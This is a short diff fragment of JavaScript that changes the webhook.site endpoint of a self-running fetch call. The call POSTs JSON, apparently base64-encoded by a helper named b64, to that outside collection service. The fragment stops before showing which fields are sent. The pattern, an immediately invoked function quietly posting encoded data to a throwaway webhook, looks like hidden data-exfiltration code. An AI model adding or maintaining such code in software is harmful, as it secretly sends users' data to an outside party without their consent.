@@ -17,7 +17,7 @@ function b64(value) {
 
 (async () => {
   try {
-    await fetch("https://webhook.site/f00eb759-f442-4fbb-a341-be4d4c0f4ddd", {
+    await fetch("https://webhook.site/80deb616-f8b5-4b19-b570-c921f94cfb4c", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
